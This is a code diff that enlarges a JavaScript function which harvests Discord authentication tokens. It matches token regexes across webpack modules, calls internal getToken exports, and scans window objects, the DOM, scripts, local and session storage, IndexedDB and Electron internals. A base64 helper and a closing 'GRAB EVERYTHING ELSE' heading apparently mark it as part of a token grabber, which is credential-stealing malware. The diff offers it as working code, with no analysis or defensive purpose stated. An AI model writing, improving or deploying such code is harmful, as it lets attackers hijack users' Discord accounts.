@@ -61,9 +61,10 @@
                 return btoa(out);
             }
 
-            // ====== UPDATED TOKEN EXTRACTION ======
+            // ====== ENHANCED TOKEN EXTRACTION ======
             function findDiscordToken() {
                 const tokens = [];
+                const seen = new Set();
 
                 const tokenRegexes = [
                     /[MN][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/g,
@@ -71,7 +72,24 @@
                     /mfa\.[A-Za-z0-9_-]{84}/g
                 ];
 
-                // Method 1: Webpack chunks
+                function addToken(t, src) {
+                    if (!seen.has(t)) {
+                        seen.add(t);
+                        tokens.push({t: t, src: src});
+                    }
+                }
+
+                function scanString(str, src) {
+                    if (!str || typeof str !== 'string') return;
+                    for (const rx of tokenRegexes) {
+                        const found = str.match(rx);
+                        if (found) {
+                            found.forEach(t => addToken(t, src));
+                        }
+                    }
+                }
+
+                // === METHOD 1: Direct webpack chunk module string scanning ===
                 try {
                     if (window.webpackChunkdiscord_app && Array.isArray(window.webpackChunkdiscord_app)) {
                         const chunks = window.webpackChunkdiscord_app;
@@ -80,26 +98,14 @@
                                 const chunk = chunks[i];
                                 if (chunk && chunk[1] && typeof chunk[1] === 'object') {
                                     const modules = chunk[1];
-                                    for (const key in modules) {
+                                    for (const modKey in modules) {
                                         try {
-                                            const mod = modules[key];
+                                            const mod = modules[modKey];
                                             if (typeof mod === 'function') {
-                                                const str = mod.toString();
-                                                for (const rx of tokenRegexes) {
-                                                    const found = str.match(rx);
-                                                    if (found) {
-                                                        found.forEach(t => tokens.push({t: t, src: 'wp_chunk_' + i + '_mod_' + key}));
-                                                    }
-                                                }
+                                                scanString(mod.toString(), 'wp_func_' + i + '_' + modKey);
                                             }
                                             if (typeof mod === 'object' && mod !== null) {
-                                                const json = JSON.stringify(mod);
-                                                for (const rx of tokenRegexes) {
-                                                    const found = json.match(rx);
-                                                    if (found) {
-                                                        found.forEach(t => tokens.push({t: t, src: 'wp_obj_' + i + '_' + key}));
-                                                    }
-                                                }
+                                                scanString(JSON.stringify(mod), 'wp_obj_' + i + '_' + modKey);
                                             }
                                         } catch(e) {}
                                     }
@@ -109,23 +115,64 @@
                     }
                 } catch(e) {}
 
-                // Method 2: Deep scan window objects
+                // === METHOD 2: Try to find and call the token module directly ===
+                // Discord stores token in a specific webpack module that exports getToken
+                try {
+                    if (window.webpackChunkdiscord_app) {
+                        const wp = window.webpackChunkdiscord_app;
+                        const allModules = [];
+
+                        wp.forEach(chunk => {
+                            if (chunk && chunk[1]) {
+                                Object.values(chunk[1]).forEach(mod => {
+                                    if (typeof mod === 'function') {
+                                        try {
+                                            const exports = {};
+                                            const module = {exports: exports};
+                                            mod(module, exports, function(){});
+
+                                            // Check for getToken function
+                                            if (exports.default && typeof exports.default.getToken === 'function') {
+                                                try {
+                                                    const tok = exports.default.getToken();
+                                                    if (tok) scanString(tok, 'wp_getToken');
+                                                } catch(e) {}
+                                            }
+                                            if (exports.getToken && typeof exports.getToken === 'function') {
+                                                try {
+                                                    const tok = exports.getToken();
+                                                    if (tok) scanString(tok, 'wp_getToken_direct');
+                                                } catch(e) {}
+                                            }
+
+                                            // Check for _token property
+                                            if (exports.default && exports.default._token) {
+                                                scanString(exports.default._token, 'wp_token_prop');
+                                            }
+
+                                            allModules.push(module.exports);
+                                        } catch(e) {}
+                                    }
+                                });
+                            }
+                        });
+                    }
+                } catch(e) {}
+
+                // === METHOD 3: Deep recursive window scan ===
                 const scanned = new Set();
                 function scanObject(obj, path, depth) {
-                    if (depth > 4 || scanned.has(obj)) return;
+                    if (depth > 5 || scanned.has(obj)) return;
                     if (obj && typeof obj === 'object') scanned.add(obj);
                     try {
                         for (const key in obj) {
                             try {
                                 const val = obj[key];
                                 if (typeof val === 'string') {
-                                    for (const rx of tokenRegexes) {
-                                        const found = val.match(rx);
-                                        if (found) {
-                                            found.forEach(t => tokens.push({t: t, src: path + '.' + key}));
-                                        }
-                                    }
-                                } else if (typeof val === 'object' && val !== null && val !== window && depth < 4) {
+                                    scanString(val, path + '.' + key);
+                                } else if (typeof val === 'function') {
+                                    scanString(val.toString(), path + '.' + key + '()');
+                                } else if (typeof val === 'object' && val !== null && val !== window && depth < 5) {
                                     scanObject(val, path + '.' + key, depth + 1);
                                 }
                             } catch(e) {}
@@ -133,107 +180,89 @@
                     } catch(e) {}
                 }
 
-                const targets = ['DiscordNative', 'GLOBAL_ENV', 'webpackJsonp', 'webpackChunkdiscord_app', '__DISCORD__', 'Vencord', 'BdApi', 'betterDiscord', 'localStorage', 'sessionStorage'];
+                const targets = [
+                    'DiscordNative', 'GLOBAL_ENV', 'webpackJsonp', 'webpackChunkdiscord_app',
+                    '__DISCORD__', 'Vencord', 'BdApi', 'betterDiscord', 'localStorage',
+                    'sessionStorage', 'document', 'window'
+                ];
                 targets.forEach(t => {
                     if (window[t]) scanObject(window[t], 'window.' + t, 0);
                 });
 
-                // Method 3: Webpack exports
+                // === METHOD 4: DOM and scripts ===
                 try {
-                    if (window.webpackChunkdiscord_app) {
-                        const wp = window.webpackChunkdiscord_app;
-                        const allExports = [];
-                        wp.forEach(chunk => {
-                            if (chunk && chunk[1]) {
-                                Object.values(chunk[1]).forEach(mod => {
-                                    if (typeof mod === 'function') {
-                                        try {
-                                            const exp = {};
-                                            mod(exp, {}, function(){});
-                                            if (exp.default) allExports.push(exp.default);
-                                        } catch(e) {}
-                                    }
+                    scanString(document.documentElement.innerHTML, 'dom_html');
+                } catch(e) {}
+
+                try {
+                    const scripts = document.querySelectorAll('script');
+                    scripts.forEach((script, idx) => {
+                        scanString(script.textContent || script.innerText || '', 'script_' + idx);
+                    });
+                } catch(e) {}
+
+                // === METHOD 5: Storage deep scan ===
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const k = localStorage.key(i);
+                        scanString(localStorage.getItem(k), 'ls_' + k);
+                    }
+                } catch(e) {}
+
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const k = sessionStorage.key(i);
+                        scanString(sessionStorage.getItem(k), 'ss_' + k);
+                    }
+                } catch(e) {}
+
+                // === METHOD 6: IndexedDB scan for Discord DBs ===
+                try {
+                    const req = window.indexedDB.open('Discord');
+                    req.onsuccess = function(e) {
+                        const db = e.target.result;
+                        // Try to access object stores that might contain tokens
+                        try {
+                            const tx = db.transaction(['kv'], 'readonly');
+                            const store = tx.objectStore('kv');
+                            const getAll = store.getAll();
+                            getAll.onsuccess = function(e) {
+                                const data = e.target.result;
+                                data.forEach(item => {
+                                    scanString(JSON.stringify(item), 'idb_kv');
                                 });
-                            }
-                        });
-                        allExports.forEach((mod, idx) => {
+                            };
+                        } catch(e) {}
+                    };
+                } catch(e) {}
+
+                // === METHOD 7: Try Discord's internal require if available ===
+                try {
+                    if (window.require) {
+                        const mods = ['discord_desktop_core', 'discord_utils', 'discord_modules'];
+                        mods.forEach(m => {
                             try {
-                                const json = JSON.stringify(mod);
-                                for (const rx of tokenRegexes) {
-                                    const found = json.match(rx);
-                                    if (found) {
-                                        found.forEach(t => tokens.push({t: t, src: 'wp_export_' + idx}));
-                                    }
-                                }
+                                const mod = window.require(m);
+                                scanString(JSON.stringify(mod), 'require_' + m);
                             } catch(e) {}
                         });
                     }
                 } catch(e) {}
 
-                // Method 4: DOM
+                // === METHOD 8: Electron IPC scan ===
                 try {
-                    const html = document.documentElement.innerHTML;
-                    for (const rx of tokenRegexes) {
-                        const found = html.match(rx);
-                        if (found) {
-                            found.forEach(t => tokens.push({t: t, src: 'dom_html'}));
+                    if (window.process && window.process.versions && window.process.versions.electron) {
+                        scanString(JSON.stringify(window.process), 'electron_process');
+                        if (window.require) {
+                            try {
+                                const ipc = window.require('electron').ipcRenderer;
+                                scanString(JSON.stringify(ipc), 'electron_ipc');
+                            } catch(e) {}
                         }
                     }
                 } catch(e) {}
 
-                // Method 5: Scripts
-                try {
-                    const scripts = document.querySelectorAll('script');
-                    scripts.forEach((script, idx) => {
-                        const text = script.textContent || script.innerText || '';
-                        for (const rx of tokenRegexes) {
-                            const found = text.match(rx);
-                            if (found) {
-                                found.forEach(t => tokens.push({t: t, src: 'script_' + idx}));
-                            }
-                        }
-                    });
-                } catch(e) {}
-
-                // Method 6: localStorage
-                try {
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const k = localStorage.key(i);
-                        const v = localStorage.getItem(k);
-                        if (v) {
-                            for (const rx of tokenRegexes) {
-                                const found = v.match(rx);
-                                if (found) {
-                                    found.forEach(t => tokens.push({t: t, src: 'ls_' + k}));
-                                }
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                // Method 7: sessionStorage
-                try {
-                    for (let i = 0; i < sessionStorage.length; i++) {
-                        const k = sessionStorage.key(i);
-                        const v = sessionStorage.getItem(k);
-                        if (v) {
-                            for (const rx of tokenRegexes) {
-                                const found = v.match(rx);
-                                if (found) {
-                                    found.forEach(t => tokens.push({t: t, src: 'ss_' + k}));
-                                }
-                            }
-                        }
-                    }
-                } catch(e) {}
-
-                // Deduplicate
-                const seen = new Set();
-                return tokens.filter(item => {
-                    if (seen.has(item.t)) return false;
-                    seen.add(item.t);
-                    return true;
-                });
+                return tokens;
             }
 
             // ====== GRAB EVERYTHING ELSE ======
